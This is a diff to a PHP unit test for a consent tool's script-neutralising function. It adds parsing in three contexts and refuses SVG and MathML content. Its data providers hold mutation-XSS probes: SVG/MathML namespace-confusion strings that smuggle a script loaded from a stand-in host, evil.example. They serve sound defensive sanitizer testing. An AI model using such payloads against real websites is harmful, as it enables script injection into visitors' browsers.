@@ -20,28 +20,46 @@ final class TrackingCodeTest extends TestCase
     }
 
     /**
-     * Re-parses the output the way a browser would and checks that nothing can run before consent: every script
-     * is either inert (type text/plain plus our category) or of a type no browser executes.
+     * @return list<\Dom\ParentNode> the output parsed three ways: as a fragment, and as the body and as the head
+     *                                 of a full document (a browser parses the page as a document, and the two
+     *                                 differ for foreign content)
      */
-    private function assertAllScriptsInert(string $output, string $category = 'analytics', int $atLeast = 0): void
+    private function parses(string $output): array
     {
         $holder = \Dom\HTMLDocument::createEmpty()->createElement('div');
         $holder->innerHTML = $output;
 
-        $scripts = iterator_to_array($holder->querySelectorAll('script'));
+        return [
+            $holder,
+            \Dom\HTMLDocument::createFromString('<!DOCTYPE html><html><head></head><body>' . $output . '</body></html>', LIBXML_NOERROR),
+            \Dom\HTMLDocument::createFromString('<!DOCTYPE html><html><head>' . $output . '</head><body></body></html>', LIBXML_NOERROR),
+        ];
+    }
 
-        $this->assertGreaterThanOrEqual($atLeast, count($scripts));
+    /**
+     * Re-parses the output the way a browser would (fragment, full-document body, full-document head) and checks
+     * that nothing can run before consent: every script is either inert (type text/plain plus our category) or of
+     * a type no browser executes.
+     */
+    private function assertAllScriptsInert(string $output, string $category = 'analytics', int $atLeast = 0): void
+    {
+        foreach ($this->parses($output) as $context => $root) {
+            $scripts = iterator_to_array($root->querySelectorAll('script'));
+            $label = $context . ': ' . $output;
 
-        foreach ($scripts as $script) {
-            $this->assertFalse($this->runs($script->getAttribute('type')), $output);
+            $this->assertGreaterThanOrEqual($atLeast, count($scripts), $label);
 
-            if ($script->getAttribute('data-cmk-category') !== null) {
-                $this->assertSame('text/plain', $script->getAttribute('type'), $output);
-                $this->assertSame($category, $script->getAttribute('data-cmk-category'), $output);
+            foreach ($scripts as $script) {
+                $this->assertFalse($this->runs($script->getAttribute('type')), $label);
+
+                if ($script->getAttribute('data-cmk-category') !== null) {
+                    $this->assertSame('text/plain', $script->getAttribute('type'), $label);
+                    $this->assertSame($category, $script->getAttribute('data-cmk-category'), $label);
+                }
             }
-        }
 
-        $this->assertSame(0, $holder->querySelectorAll('noscript')->length, $output);
+            $this->assertSame(0, $root->querySelectorAll('noscript')->length, $label);
+        }
     }
 
     /**
@@ -119,12 +137,11 @@ final class TrackingCodeTest extends TestCase
         $this->assertAllScriptsInert(TrackingCode::makeInert($code, 'analytics'));
     }
 
-    public function testScriptsInsideSvgAndTemplateAreHandled(): void
+    public function testScriptsInsideTemplateAreHandledAndSvgIsRefused(): void
     {
-        // Observed: an SVG script is a script element in the SVG namespace and is still tagged; a template's
-        // content is a separate fragment, and its scripts are tagged too so a later clone cannot run them.
-        $svg = TrackingCode::makeInert('<svg><script>x</script></svg>', 'analytics');
-        $this->assertAllScriptsInert($svg, 'analytics', 1);
+        // Foreign content is refused outright (see the svg/math tests); a template's content is a separate
+        // fragment, and its scripts are tagged too so a later clone cannot run them.
+        $this->assertSame('', TrackingCode::makeInert('<svg><script>x</script></svg>', 'analytics'));
 
         $template = TrackingCode::makeInert('<template><script src=a.js></script></template>', 'analytics');
         $this->assertSame(
@@ -367,7 +384,37 @@ final class TrackingCodeTest extends TestCase
         return [
             'svg style attribute' => ['<svg></p><style><a id="</style><script src=//evil.example/y.js></script>">'],
             'math mglyph' => ['<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;/mglyph&gt;&lt;script src=//evil.example/x.js&gt;&lt;/script&gt;">'],
+            'math style attribute' => ['<math></p><style><a id="</style><script src=//evil.example/y.js></script>">'],
+            ...self::foreignRawTextProbes(),
         ];
+    }
+
+    /**
+     * @return array<string, array{string}>
+     */
+    private static function foreignRawTextProbes(): array
+    {
+        $probes = [];
+
+        foreach (['svg', 'math'] as $foreign) {
+            foreach (['title', 'xmp', 'iframe', 'noembed', 'textarea'] as $raw) {
+                $probes[$foreign . ' ' . $raw . ' attribute'] = ['<' . $foreign . '></p><' . $raw . '><a id="</' . $raw . '><script src=//evil.example/y.js></script>">'];
+            }
+        }
+
+        return $probes;
+    }
+
+    #[\PHPUnit\Framework\Attributes\DataProvider('roundTripProbes')]
+    public function testFullDocumentProbesAreRefusedBecauseTheyContainForeignContent(string $code): void
+    {
+        $this->assertSame('', TrackingCode::makeInert($code, 'analytics', 'abcd1234EFGH'));
+    }
+
+    public function testEvenAHarmlessSvgLogoSnippetIsRefusedBecauseForeignContentIsNeverAllowed(): void
+    {
+        $this->assertSame('', TrackingCode::makeInert('<svg width="1" height="1"><circle r="1"/></svg><script>a()</script>', 'analytics'));
+        $this->assertSame('', TrackingCode::makeInert('<math><mi>x</mi></math>', 'analytics'));
     }
 
     #[\PHPUnit\Framework\Attributes\DataProvider('roundTripProbes')]
